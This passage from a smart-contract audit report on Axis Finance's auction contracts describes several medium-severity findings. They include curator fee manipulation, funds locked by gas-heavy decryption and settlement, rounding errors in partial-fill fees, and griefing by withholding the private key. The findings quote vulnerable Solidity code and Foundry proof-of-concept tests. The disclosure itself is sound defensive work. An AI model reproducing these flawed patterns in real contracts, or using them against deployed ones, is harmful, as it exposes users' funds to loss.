From then on the only possible action involving the curator is for them to accept the invitation. They can neither be replaced, nor removed. The curator on the other side is allowed to accept the invitation at any point in time before the lot ends and the curator fee for the lot is set to the current fee the curator has set for themselves at the time of acceptance.

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L646C1-L652C101
```solidity
        if (feeData.curated || module.hasEnded(lotId_) == true) revert InvalidState();

        Routing storage routing = lotRouting[lotId_];

        // Set the curator as approved
        feeData.curated = true;
        feeData.curatorFee = fees[keycodeFromVeecode(routing.auctionReference)].curator[msg.sender];
```

The curator sets their fee by calling `setCuratorFee()` on the auction house:

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/bases/FeeManager.sol#L110C1-L116C6
```solidity
    function setCuratorFee(Keycode auctionType_, uint48 fee_) external {
        // Check that the fee is less than the maximum
        if (fee_ > fees[auctionType_].maxCuratorFee) revert InvalidFee();

        // Set the fee for the sender
        fees[auctionType_].curator[msg.sender] = fee_;
    }
```

As can be seen, the only thing mitigating the damage the curator can do is the `maxCuratorFee` that the protocol itself sets, but that wouldn't do much as this is a global limit and some curators might charge more, others less and if the protocol is to welcome the ones that charge more that would mean they have to set a higher `maxCuratorFee` that curators with bad intentions can take advantage of.

## Impact
A proposed curator can set their fee to the maximum right before accepting an invitation to curate an auction and thus incur an extra expense for the lot seller. The seller themselves have almost non-existent means to tackle a malicious curator as their only option is to cancel the auction they've set this curator to and this is only an option before the lot has started. After the lot starts the curator is guaranteed to get their fees. For fixed price auctions (atomic) that is every time a buyer calls `purchase()` and for marginal price auctions (batch) that is at `settle()`ment of the auction.

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/AuctionHouse.sol#L634-L699

## Tool used
Manual Review

## Recommendation
The safety measure I'd recommend for this issue are:
- Allow the curator to only accept their invitation before the lot has started
- Allow the seller of a lot to remove a curator as such from the lot
- Record the curator fee for the lot at the time of creating the lot



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/115.

# Issue M-7: Auction Can Be Locked with It's Funds in Decryption Phase in Mainnet Because Massive Gas Payment is Required From Users 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/117 

## Found by 
Kose
## Summary
The decryption process in the EMPA module presents a significant issue as it demands a massive amount of gas, potentially locking funds within the contract. With the burden of gas costs falling on auction participants (they are the ones that expected to decrypt the auction), there is little to no incentive to complete the decryption process in the mainnet, leading to funds being trapped within the contract.
## Vulnerability Detail
Upon conclusion of a sealed bid batch auction, the settlement process initiates with decryption. It is expected that users will call the decrypt function within the EMPA module, and only after all decryption operations are completed can the settlement proceed.This decryption task is undertaken by users of the protocol without any incentives, except for the incentive to be able to retrieve their amount back if the auction is stuck in the decryption phase, which actually can not be counted as an "incentive".

Decryption process is very expensive in terms of gas such that it doesn't have to be done in one transaction because it can exceed gas limit of a block. This is also documented by protocol in *[design/EMPA.md](https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/design/EMPA.md#auction-settlement-part-1-decryption)* as follows:
>    It may take several decryption transactions depending on the number of bids and gas limit. Once, all bids are decrypted on the contract, we can move to part 2 of the settlement process.

While such costs might be acceptable for Layer 2's, they present a serious challenge for mainnet operations. As demonstrated in the provided POC below, even with an auction which has 100 bids in total, the gas cost for decryption escalates to 7 million. Considering the mean gas price in February 2024, which is 40 gwei, and an ETH price of $3500, this translates to nearly $1,000 in gas costs for decryption.

If we consider auctions that have more bids we can reach to more catastrophic scenarios. Here is a demonstration:
Add following test to *test/modules/auctions/EMPA/settle.t.sol*. Modifier **givenLargeNumberOfUnfilledBids** is created by protocol and it has 1510 total bids in it. You can adjust the number of bids in that modifier to test different bid amounts.
```solidity
     function test_largeNumberOfUnfilledBids_gasUsageOfDecryption()
        external
        givenLotIsCreated
        givenLotHasStarted
        givenLargeNumberOfUnfilledBids
        givenLotHasConcluded
        givenPrivateKeyIsSubmitted
    {
        EncryptedMarginalPriceAuctionModule.AuctionData memory auctionData = _getAuctionData(_lotId);
        uint256 gasBefore = gasleft();
        _module.decryptAndSortBids(_lotId, auctionData.nextBidId - 1);
        uint256 gasAfter = gasleft();

        console2.log(gasBefore - gasAfter);
    }
```
Output:
>  [PASS] test_largeNumberOfUnfilledBids_gasUsageOfDecryption() (gas: 321856062)
Logs:
  101789276

In this scenario which has 1510 bids, the gas cost of decryption reached 101 million, hence it needs to be decrypted in at least 4 blocks. The cost of this decryption with 40 gwei gas price is = $14_000 (imagine it during a bullish market season). 

Failure to cover this decryption cost would result in all funds being trapped within the contract. Since there is no way to change the state of the auction once it has concluded, except through decryption, funds cannot be moved. This is an amount that cannot be reasonably expected from users to provide, thus leading to the likelihood of numerous auctions becoming stuck in the decryption phase on the mainnet.

One side note is that settle() process that comes after decryption also is a process that is costly in terms of gas. It worth nearly 1/4 of decryption process. Since decryption phase is costly enough to cause an issue, I didn't go into details of settle() process and it's gas costs in submission.
## Impact
Funds belonging to both buyers and sellers will remain trapped within the contract unless someone is willing to pay for a rescue operation. The possibility of a rescue scenario can only be anticipated within auctions where an individual has placed a high-value bid, or it may be expected from the seller. However, in both cases, these users stand to lose a significant amount of funds during the decryption process.
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol/#L441
## Tool used

Manual Review

## Recommendation
It would be unfair to suggest changing the decryption process, as it is one of the main functionalities of the system and is necessary for the sealed bid batch auction to function properly. Additionally, limiting bid amounts would not resolve the issue. Therefore, the only feasible solution that comes to mind without requiring extensive changes to the codebase is to refrain from using the mainnet for the EMPA module.



## Discussion

**Oighty**

Acknowledge decryption and settlement can be expensive. I'm not sure this is an issue as much as a good heads up (and understanding of the system). We are not planning to deploy this module to mainnet initially, but I don't think I put that in the contest notes. However, we are doing a couple things to mitigate this in general:
1. Working on a more optimized queue implementation that doesn't brick decrypt or settle on so few bids
2. Due to some of the other "funds stuck" issues, changing the rules on claiming refunds so that a user doesn't get stuck.
3. Preventing non-gas stuck issues, such as blacklist reverting a major step.

**nevillehuang**

Interesting finding, but could be invalid, not sure if massive gas costs would qualify as medium severity, because at the end of the day, it is still related to "gas optimization".

**nevillehuang**

request poc

If block gas limit is never reached, I believe this issue to be invalid.

**sherlock-admin3**

PoC requested from @kosedogus

Requests remaining: **1**

**kosedogus**

The submission's purpose is related to incentives sir, not gas optimization. I recommended not using the module in mainnet, not optimizing it because it won't change the result that much considering the current implementation can require multiple blocks for decryption. I couldn't find anything related to that in "Criteria for Issue Validity" documentation in Sherlock. For reference for example we know the issues related to "no incentive to liquidate", in those issues liquidation does not provide value to liquidator, instead results in liquidator paying more than incentive because of gas payment is bigger than liquidation prize. In this issue, decryption of bids are given to users, so we can think users as liquidators by analogy. Users has to decrypt the bids in order for process to continue, otherwise all funds will stay locked, if we continue with analogy it is even worst than bad debt accruing. So users have to pay for this decrypt() calls in order for funds to unlock. But as I showed these users have to pay for gas in the range of thousands and in some cases tens of thousands of dollars in mainnet. So it is very easy to encounter scenarios where total locked funds is less than decryption cost. 

That was why I suggested to not deploy to mainnet, there will be many auctions that stuck in decryption phase because of lack of incentive to finish to auction. Sponsor mentioned this won't be deployed in mainnet, which is perfect, then we don't have any problem in this regard. But it wasn't mentioned in anywhere we can see like sponsor mentioned, and in contest README, we saw the protocol will also be deployed to mainnet.

Although I can provide a POC for this process(not for decrypt(), but for settle()) to reach gas limit, I think it is not necessary considering the purpose of the submission. It won't be fair for this issue to be duplicate of gas limit issues (both for those issues and for this issue).

Thank you.

**nevillehuang**

@kosedogus This is an extremely interesting finding, so I will be leaving it open for escalation period. I definitely agree with medium severity, given the potential funds required to decrypt for auctions with higher bids (which could be not uncommon based on sponsors [comments here](https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/237#issuecomment-2041450204). The trigger seems to be a large number of bids, but the involved fixes are all different due to the different logic in looping through bids during different mechanism (decrypting/refunding/settling)

# Issue M-8: Code that Written in Order to Optimize Gas, Instead Nearly Triples Gas Usage 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/118 

## Found by 
Kose
## Summary
Gas refund mechanism misconception creates a significant amount of gas usage while trying to optimize for gas.
## Vulnerability Detail
The settlement process within the auction mechanism is executed by invoking the settle() function in the AuctionHouse. This function trace leads to the _settle() function within the EMPA module. Within this function, an iteration is conducted through all decrypted bids, deleting them individually to facilitate gas refund and prevent potential gas exhaustion during the settlement transaction. This deletion process doesn't provide any value or functionality to function except gas deletion. Here is the process:
```solidity
        // Delete the rest of the decrypted bids queue for a gas refund
        {
            Queue storage queue = decryptedBids[lotId_];
            uint256 remainingBids = queue.getNumBids();
            if (remainingBids > 0) {
                for (uint256 i = remainingBids - 1; i >= 0; i--) {
                    uint64 bidId = queue.bidIdList[i];
                    delete queue.idToBidMap[bidId];
                    queue.bidIdList.pop();

                    // Otherwise an underflow will occur
                    if (i == 0) {
                        break;
                    }
                }
                delete queue.numBids;
            }
        }
```
As we can see this is done in order to reduce gas consumption in settle() function. While intended to reduce gas consumption within the settle() function, this implementation unfortunately introduces more harm than benefit due to a probable misunderstanding of the gas refund mechanism. 

I will start by showing the harm, then will explain why.
To illustrate the adverse effects, execute the *test_largeNumberOfUnfilledBids_gasUsage* test using the command *forge test --mt test_largeNumberOfUnfilledBids_gasUsage -vv*. This protocol-implemented test evaluates the gas usage of the _settle() call when there are 1500 bids within an auction, which returns a result of 3,836,948 gas units.

Now if we modify the EMPAM.sol file and remove the part that is passed above from _settle() function and rerun the test, gas usage will dropped significantly to 1,667,850 gas units.

This shows that the mentioned deletion process consumes an excessive amount of gas, totaling approximately 2.2 million gas units if there are 1500 bids in an auction.

Now let's continue with probable gas refund misconception.
Here are some quotes about gas refund taken from [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf):
>   Ar is the refund balance, increased through using the SSTORE instruction in order to reset contract storage to zero from some non-zero value. Though not immediately refunded, it is allowed to partially offset the total execution costs.

>   Then the state is finalised by determining the amount to be refunded, g∗ from the remaining gas, g′, plus some allowance from the refund counter, to the sender at the original rate.

>    The total refundable amount is the legitimately remaining gas g′, added to Ar, with the latter component being capped up to a maximum of one fifth (rounded down) of the total amount used Tg − g′. Therefore, g∗ is the total gas that remains after the transaction has been executed.

>    The max refundable proportion of gas was reduced from one half to one fifth by EIP-3529 by Buterin and Swende [2021] in the London release.

>    If there is not enough gas remaining to pay this, i.e. g∗∗ < c, then we also declare an out-of-gas exception. The gas remaining will be zero in any such exceptional condition...... However, the value of the transaction is not transferred to the aborted contract’s address when we are out-of-gas, thus the contract’s code is not stored. If such an exception does not occur, then the remaining gas is refunded to the originator and the now-altered state is allowed to persist.

Let me elaborate what I am trying to show:
Primarily, gas refunds via this mechanism (Ar) are constrained to one-fifth of the total gas consumed. Hence in the scenario provided above, after gas refunded, 3836948 can at most drop to 3069559, which leads to nearly two times more gas usage while the goal is reducing the gas usage. We don't see the result in test because gas refunds are done after transaction execution finished, which the provided test does not calculate that (it is hard to calculate in Foundry currently, an improvement for this is proposed and will probably be added to Foundry in the near future), it just calculates gas used during the settle() process without considering refund. Which brings us to next problem.
As we can see from above explanations, gas refunds are done after transaction execution if it is succesful, not in the moment of deleting from queue. Hence if transaction reaches to block gas limit, the refund won't happen and the call will revert.

Now, if we change the number in modifier *givenLargeNumberOfUnfilledBids* from 1500 unfilled bids to 14000 unfilled bids:
```solidity
    modifier givenLargeNumberOfUnfilledBids() {
        // Create 10 bids that will fill capacity
        for (uint256 i; i < 10; i++) {
            _createBid(2e18, 1e18);
        }

        // Create more bids that will not be filled
        // Lower price, otherwise they will be filled first due to ordering
        for (uint256 i; i < 14000; i++) {
            _createBid(19e17, 1e18);
        }

        // Marginal price: 2
        _expectedMarginalPrice = _scaleQuoteTokenAmount(2 * _BASE_SCALE);
        _expectedMarginalBidId = 10;

        _expectedTotalIn = 10 * 2e18;
        _expectedTotalOut = 10 * 1e18;
        _;
    }
```
And  rerun the same test both with this gas optimization, and without that optimization part (again with deleting it), we will reach the following results:
- With optimization = 31,244,540
- Without optimization = 11,025,345

Hence, as a result of the code implemented for gas optimization, we reach to the block gas limit approximately three times faster. Moreover, due to this acceleration, refunds fail to occur because the transaction cannot succeed under these conditions. Consequently, all funds become locked permanently since the auction has concluded, decryption is complete, and the only callable function, **settle()**, cannot execute due to the gas limit.

This is however is not the main focus of this submission, revert due to block gas limit will happen even if this problem solved, but with this "gas optimization", it is reached 3 times faster which further promotes that problem's likelihood (It's submitted seperately in #3 (EMPA's Can be Locked because of Reaching Block Gas Limit)).  

From Sherlock's Criteria for Issue Validity:
>  List of Issue categories that are not considered valid:
Gas optimizations: The user/protocol ends up paying a little extra gas because of this issue.

However, the impact of this function goes beyond a mere increment in gas usage. Despite being designed for gas optimization, it at least doubles the amount of gas paid in every settle() call (nearly triples at some cases). Considering that settlement process itself is inherently gas-expensive, with typical usage costing millions of gas, doubling or tripling these amounts could easily escalate gas usage into tens of millions. Therefore, I believe this issue cannot be categorized as merely paying "a little extra gas".


## Impact
The code implemented for gas optimization results in a significant increase in gas usage, ranging from two to three times more than usual. This escalation often reaches into the millions of gas units and, in certain instances, even tens of millions.
## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol/#L767-L784
## Tool used

Manual Review

## Recommendation
Remove the Queue deleting part from _settle() function in EMPAM.sol

# Issue M-9: EMPAM and FPAM auction modules do not implement catalogue functions 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/130 

## Found by 
JohnSmith, cryptic
## Summary
The `Catalogue.sol` contract contains view functions which provide important information for auctions. These include functions that provide estimates regarding the payout a user will receive for a payment amount, the payment they must send to receive a specific payout, etc. These functions are expected to be implemented by the auction modules. However, `EMPAM.sol` (batch auction module) and `FPAM.sol` (atomic auction module) do not implement these functionalities. This will cause a permanent DoS of the core functionalities of the catalogue contract for these modules and users will not be able to view any information regarding auctions created using either modules and the payments associated with them.

## Vulnerability Detail
`EMPA.md` states the following (location: /design/EMPA.md):

```solidity
We will provide a user interface (aka dApp) for both Sellers and Buyers to interact with the product. The key user actions are defined below in the Actions section. The core pages we be:
- List of auctions (TBD on design and filtering between statuses)
- Create auction page - for sellers to create new auctions
- Auction page - Details the status and available actions for a given auction. The auction page will need to support these differents states:
  - Created - Auction has been created, but not started
  - Live - Auction is created and currently accepting bids. Buyers should be able to bid and cancel bids they have made.
  - Concluded - Auction has ended and bids are being decrypted. Anyone should be able to decrypt the bids and submit them to the contract for verification.
  - Decrypted - Bids are decrypted and awaiting settlement. Anyone should be able to settle the auction.
  - Settled - Auction payouts have been issued. Buyers that did not win can claim refunds.
```

Although buyers can view the list of auctions in the provided UI, there's no indication that they can view information regarding prices, which is why the catalogue contract is very important for buyers. They can estimate what price to pay, in quote tokens to receive a specific amount of base tokens, and vice versa. Lets look at exactly which functions will suffer from DoS and why.

`Catalogue::payoutFor`
```javascript
    function payoutFor(uint96 lotId_, uint96 amount_) external view returns (uint256) {
        Auction module = Auctioneer(auctionHouse).getModuleForId(lotId_);
        Auctioneer.Routing memory routing = getRouting(lotId_);

        // Get protocol fee from FeeManager
        // TODO depending on whether this is a purchase or a bid, we should use different fee sources
        (uint48 protocolFee, uint48 referrerFee,) =
            FeeManager(auctionHouse).fees(keycodeFromVeecode(routing.auctionReference));

        // Calculate fees
        (uint256 toProtocol, uint256 toReferrer) =
            FeeManager(auctionHouse).calculateQuoteFees(protocolFee, referrerFee, true, amount_); // we assume there is a referrer to give a conservative amount

        // Get payout from module
@>      return module.payoutFor(lotId_, amount_ - uint96(toProtocol) - uint96(toReferrer));
    }
```

In this function, the user can pass in the id for a lot with the amount of quote tokens they would like to pay. They expect to receive the amount of base tokens they will get for that payment. After deducting fees from the payment, a call to `AuctionModule::payoutFor` is made.

`AuctionModule::payoutFor`
```javascript
    function payoutFor(uint96 lotId_, uint96 amount_) public view virtual returns (uint96) {}
```

The function is expected to be implemented by the auction module (this was also confirmed with the developer team on discord). So far there are two auction modules implemented, `EMPAM.sol` (batch auction module) and `FPAM.sol` (atomic auction module). Sellers can create new auctions within these modules, but they cannot create new modules due to access control.

Looking at `EMPAM.sol` and `FPAM.sol`, neither auctions implement `payoutFor`. When users attempt to call this function, it will revert, and users will be unable to estimate payouts and cannot assess/accomodate their purchases in advance, indefinitely. In addition to `payoutFor`, the following will also suffer from permanent DoS because they are not implemented in either auction modules:

`priceFor`: Users will not be able to estimate the price (including fees, etc) for a specific payout
`maxPayout`: Users will not be able to check the max payout they may receive for an auction
`maxAmountAccepted`: Users will not be able to check the max amount of quote tokens accepted for an auction

## Impact
Permanent DoS of the core functionalities of the Catalogue contract. Buyers will not be able to view information of auctions, especially regarding the prices, which will cause massive hindrance and confusion for buyers. It is very likely that many potential buyers will simply opt-out of participating in these auctions, which will lead to sellers not participating, and overall loss for Axis Finance.

## Code Snippet
https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/Catalogue.sol#L72

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/Auction.sol#L235

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/EMPAM.sol#L13

https://github.com/sherlock-audit/2024-03-axis-finance/blob/main/moonraker/src/modules/auctions/FPAM.sol#L12

## Tool used
Manual Review

## Recommendation
Implement the functions above for both batch (EMPAM) and atomic (FPAM) auctions, so buyers can interact with the catalogue.



## Discussion

**Oighty**

Acknowledged and will update. The Catalogue is mostly appropriate for atomic auctions or providing functions to get lists of auctions at different states. Given we are refactoring the AuctionHouse into two components. It likely will make sense for Catalogue as well.

# Issue M-10: User's can be grieved by not submitting the private key 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/174 

## Found by 
FindEverythingX, devblixt, hash, jecikpo, merlin, novaman33, underdog
## Summary
User's can be grieved by not submitting the private key

## Vulnerability Detail

Bids cannot be refunded once the auction concludes. And bids cannot be claimed until the auction has been settled. Similarly a EMPAM auction cannot be cancelled once started. 

```solidity
    function claimBids(
        uint96 lotId_,
        uint64[] calldata bidIds_
    )
        external
        override
        onlyInternal
        returns (BidClaim[] memory bidClaims, bytes memory auctionOutput)
    {
        // Standard validation
        _revertIfLotInvalid(lotId_);
        _revertIfLotNotSettled(lotId_);
```

```solidity
    function refundBid(
        uint96 lotId_,
        uint64 bidId_,
        address caller_
    ) external override onlyInternal returns (uint96 refund) {
        // Standard validation
        _revertIfLotInvalid(lotId_);
        _revertIfBeforeLotStart(lotId_);
        _revertIfBidInvalid(lotId_, bidId_);
        _revertIfNotBidOwner(lotId_, bidId_, caller_);
        _revertIfBidClaimed(lotId_, bidId_);
        _revertIfLotConcluded(lotId_);
```

```solidity
    function _cancelAuction(uint96 lotId_) internal override {
        // Validation
        // Batch auctions cannot be cancelled once started, otherwise the seller could cancel the auction after bids have been submitted
        _revertIfLotActive(lotId_);
```

```solidity
    function cancelAuction(uint96 lotId_) external override onlyInternal {
        // Validation
        _revertIfLotInvalid(lotId_);
        _revertIfLotConcluded(lotId_);
```

```solidity
    function _settle(uint96 lotId_)
        internal
        override
        returns (Settlement memory settlement_, bytes memory auctionOutput_)
    {
        // Settle the auction
        // Check that auction is in the right state for settlement
        if (auctionData[lotId_].status != Auction.Status.Decrypted) {
            revert Auction_WrongState(lotId_);
        }
```

For EMPAM auctions, the private key associated with the auction has to be submitted before the auction can be settled. In auctions where the private key is held by the seller, they can grief the bidder's or in cases where a key management solution is used, both seller and bidder's can be griefed by not submitting the private key.

## Impact

User's will not be able to claim their assets in case the private key holder doesn't submit the key for decryption 

## Code Snippet

https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/auctions/EMPAM.sol#L747-L756

## Tool used

Manual Review

## Recommendation

Acknowledge the risk involved for the seller and bidder

# Issue M-11: Bidder's payout claim could fail due to validation checks in LinearVesting 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/178 

## Found by 
Aymen0909, FindEverythingX, ether\_sky, hash, sl1
## Summary
Bidder's payout claim will fail due to validation checks in LinearVesting after the expiry timestamp

## Vulnerability Detail

Bidder's payout are sent by internally calling the `_sendPayout` function. In case the payout is a derivative which has already expired, this will revert due to the validation check of `block.timestmap < expiry` present in the mint function of LinearVesting derivative

```solidity
    function _sendPayout(
        address recipient_,
        uint256 payoutAmount_,
        Routing memory routingParams_,
        bytes memory
    ) internal {
        
        if (fromVeecode(derivativeReference) == bytes7("")) {
            Transfer.transfer(baseToken, recipient_, payoutAmount_, true);
        }
        else {
            
            DerivativeModule module = DerivativeModule(_getModuleIfInstalled(derivativeReference));

            Transfer.approve(baseToken, address(module), payoutAmount_);

=>          module.mint(
                recipient_,
                address(baseToken),
                routingParams_.derivativeParams,
                payoutAmount_,
                routingParams_.wrapDerivative
            );
```

```solidity
    function mint(
        address to_,
        address underlyingToken_,
        bytes memory params_,
        uint256 amount_,
        bool wrapped_
    )
        external
        virtual
        override
        returns (uint256 tokenId_, address wrappedAddress_, uint256 amountCreated_)
    {
        if (amount_ == 0) revert InvalidParams();

        VestingParams memory params = _decodeVestingParams(params_);

        if (_validate(underlyingToken_, params) == false) {
            revert InvalidParams();
        }
```

```solidity
    function _validate(
        address underlyingToken_,
        VestingParams memory data_
    ) internal view returns (bool) {
        
        ....

=>      if (data_.expiry < block.timestamp) return false;


        // Check that the underlying token is not 0
        if (underlyingToken_ == address(0)) return false;


        return true;
    }
```

Hence the user's won't be able to claim their payouts of an auction once the derivative has expired. For EMPAM auctions, a seller can also wait till this timestmap passes before revealing their private key which will disallow bidders from claiming their rewards.

## Impact

Bidder's won't be able claim payouts from auction after the derivative expiry timestamp

## Code Snippet

_sendPayout invoking mint function on derivative to send payouts 
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/AuctionHouse.sol#L823-L829

linear vesting derivative expiry checks
https://github.com/sherlock-audit/2024-03-axis-finance/blob/cadf331f12b485bac184111cdc9ba1344d9fbf01/moonraker/src/modules/derivatives/LinearVesting.sol#L521-L541

## Tool used

Manual Review

## Recommendation

Allow to mint tokens even after expiry of the vesting token / deploy the derivative token first itself and when making the payout, transfer the base token directly incase the expiry time is passed



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/Axis-Fi/moonraker/pull/116.

# Issue M-12: Inaccurate value is used for partial fill quote amount when calculating fees 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/182 

## Found by 
hash
## Summary
Inaccurate value is used for partial fill quote amount when calculating fees which can cause reward claiming / payment withdrawal to revert

## Vulnerability Detail

The fees of an auction is managed as follows:

1. Whenever a bidder claims their payout, calculate the amount of quote tokens that should be collected as fees (instead of giving the entire quote amount to the seller) and add this to the protocol / referrers rewards

```solidity
    function claimBids(uint96 lotId_, uint64[] calldata bidIds_) external override nonReentrant {
        
        ....

        for (uint256 i = 0; i < bidClaimsLen; i++) {
            Auction.BidClaim memory bidClaim = bidClaims[i];

            if (bidClaim.payout > 0) {
               
=>              _allocateQuoteFees(
                    protocolFee,
                    referrerFee,
                    bidClaim.referrer,
                    routing.seller,
                    routing.quoteToken,
=>                  bidClaim.paid
                );
```

Here bidClaim.paid is the amount of quote tokens that was transferred in by the bidder for the purchase

```solidity
    function _allocateQuoteFees(
        uint96 protocolFee_,
        uint96 referrerFee_,
        address referrer_,
        address seller_,
        ERC20 quoteToken_,
        uint96 amount_
    ) internal returns (uint96 totalFees) {
        // Calculate fees for purchase
        (uint96 toReferrer, uint96 toProtocol) = calculateQuoteFees(
            protocolFee_, referrerFee_, referrer_ != address(0) && referrer_ != seller_, amount_
        );

        // Update fee balances if non-zero
        if (toReferrer > 0) rewards[referrer_][quoteToken_] += uint256(toReferrer);
        if (toProtocol > 0) rewards[_protocol][quoteToken_] += uint256(toProtocol);


        return toReferrer + toProtocol;
    }
```

2. Whenever the seller calls claimProceeds to withdraw the amount of quote tokens received from the auction, subtract the quote fees and give out the remaining

```solidity
    function claimProceeds(
        uint96 lotId_,
        bytes calldata callbackData_
    ) external override nonReentrant {
        
        ....
        
        uint96 totalInLessFees;
        {
=>          (, uint96 toProtocol) = calculateQuoteFees(
                lotFees[lotId_].protocolFee, lotFees[lotId_].referrerFee, false, purchased_
            );
            unchecked {
=>              totalInLessFees = purchased_ - toProtocol;
            }
        }
```

Here purchased is the total quote token amount that was collected for this auction.

In case the fees calculated in claimProceeds is less than the sum of fees allocated to the protocol / referrer via claimBids, there will be a mismatch causing the sum of (fees allocated + seller purchased quote tokens) to be greater than the total quote token amount that was transferred in for the auction. This could cause either the protocol/referrer to not obtain their rewards or the seller to not be able to claim the purchased tokens in case there are no excess quote token present in the auction house contract.

In case, totalPurchased is >= sum of all individual bid quote token amounts (as it is supposed to be), the fee allocation would be correct. But due to the inaccurate computation of the input quote token amount associated with a partial fill, it is possible for the above scenario (ie. `fees calculated in claimProceeds is less than the sum of fees allocated to the protocol / referrer via claimBids`) to occur

```solidity
    function settle(uint96 lotId_) external override nonReentrant {
        
        ....

            if (settlement.pfBidder != address(0)) {

                _allocateQuoteFees(
                    feeData.protocolFee,
                    feeData.referrerFee,
                    settlement.pfReferrer,
                    routing.seller,
                    routing.quoteToken,

                    // @audit this method of calculating the input quote token amount associated with a partial fill is not accurate
                    uint96(
=>                      Math.mulDivDown(
                            settlement.pfPayout, settlement.totalIn, settlement.totalOut
                        )
                    )
```

The above method of calculating the input token amount associated with a partial fill can cause this value to be higher than the acutal value and hence the fees allocated will be less than what the fees that will be captured from the seller will be

### POC
Apply the following diff to `test/AuctionHouse/AuctionHouseTest.sol` and run `forge test --mt testHash_SpecificPartialRounding -vv`

It is asserted that the tokens allocated as fees is greater than the tokens that will be captured from a seller for fees

```diff
diff --git a/moonraker/test/AuctionHouse/AuctionHouseTest.sol b/moonraker/test/AuctionHouse/AuctionHouseTest.sol
index 44e717d..9b32834 100644
--- a/moonraker/test/AuctionHouse/AuctionHouseTest.sol
+++ b/moonraker/test/AuctionHouse/AuctionHouseTest.sol
@@ -6,6 +6,8 @@ import {Test} from "forge-std/Test.sol";
 import {ERC20} from "solmate/tokens/ERC20.sol";
 import {Transfer} from "src/lib/Transfer.sol";
 import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
+import {SafeCastLib} from "solmate/utils/SafeCastLib.sol";
+
 
 // Mocks
 import {MockAtomicAuctionModule} from "test/modules/Auction/MockAtomicAuctionModule.sol";
@@ -134,6 +136,158 @@ abstract contract AuctionHouseTest is Test, Permit2User {
         _bidder = vm.addr(_bidderKey);
     }
 
+        function testHash_SpecificPartialRounding() public {
+        /*
+            capacity 1056499719758481066
+            previous total amount 1000000000000000000
+            bid amount 2999999999999999999997
+            price 2556460687578254783645
+            fullFill 1173497411705521567
+            excess 117388857750942341
+            pfPayout 1056108553954579226
+            pfRefund 300100000000000000633
+            new totalAmountIn 2700899999999999999364
+            usedContributionForQuoteFees 2699900000000000000698
+            quoteTokens1 1000000
+            quoteTokens2 2699900000
+            quoteTokensAllocated 2700899999
+        */
+
+        uint bidAmount = 2999999999999999999997;
+        uint marginalPrice = 2556460687578254783645;
+        uint capacity = 1056499719758481066;
+        uint previousTotalAmount = 1000000000000000000;
+        uint baseScale = 1e18;
+
+        // hasn't reached the capacity with previousTotalAmount
+        assert(
+            FixedPointMathLib.mulDivDown(previousTotalAmount, baseScale, marginalPrice) <
+                capacity
+        );
+
+        uint capacityExpended = FixedPointMathLib.mulDivDown(
+            previousTotalAmount + bidAmount,
+            baseScale,
+            marginalPrice
+        );
+        assert(capacityExpended > capacity);
+
+        uint totalAmountIn = previousTotalAmount + bidAmount;
+
+        uint256 fullFill = FixedPointMathLib.mulDivDown(
+            uint256(bidAmount),
+            baseScale,
+            marginalPrice
+        );
+
+        uint256 excess = capacityExpended - capacity;
+
+        uint pfPayout = SafeCastLib.safeCastTo96(fullFill - excess);
+        uint pfRefund = SafeCastLib.safeCastTo96(
+            FixedPointMathLib.mulDivDown(uint256(bidAmount), excess, fullFill)
+        );
+
+        totalAmountIn -= pfRefund;
+
+        uint usedContributionForQuoteFees;
+        {
+            uint totalOut = SafeCastLib.safeCastTo96(
+                capacityExpended > capacity ? capacity : capacityExpended
+            );
+
+            usedContributionForQuoteFees = FixedPointMathLib.mulDivDown(
+                pfPayout,
+                totalAmountIn,
+                totalOut
+            );
+        }
+
+        {
+            uint actualContribution = bidAmount - pfRefund;
+
+            // acutal contribution is less than the usedContributionForQuoteFees
+            assert(actualContribution < usedContributionForQuoteFees);
+            console2.log("actual contribution", actualContribution);
+            console2.log(
+                "used contribution for fees",
+                usedContributionForQuoteFees
+            );
+        }
+
+        // calculating quote fees allocation
+        // quote fees captured from the seller
+        {
+            (, uint96 quoteTokensAllocated) = calculateQuoteFees(
+                1e3,
+                0,
+                false,
+                SafeCastLib.safeCastTo96(totalAmountIn)
+            );
+
+            // quote tokens that will be allocated for the earlier bid
+            (, uint96 quoteTokens1) = calculateQuoteFees(
+                1e3,
+                0,
+                false,
+                SafeCastLib.safeCastTo96(previousTotalAmount)
+            );
+
+            // quote tokens that will be allocated for the partial fill
+            (, uint96 quoteTokens2) = calculateQuoteFees(
+                1e3,
+                0,
+                false,
+                SafeCastLib.safeCastTo96(usedContributionForQuoteFees)
+            );
+            
+            console2.log("quoteTokens1", quoteTokens1);
+            console2.log("quoteTokens2", quoteTokens2);
+            console2.log("quoteTokensAllocated", quoteTokensAllocated);
+
+            // quoteToken fees allocated is greater than what will be captured from seller
+            assert(quoteTokens1 + quoteTokens2 > quoteTokensAllocated);
+        }
+    }
+
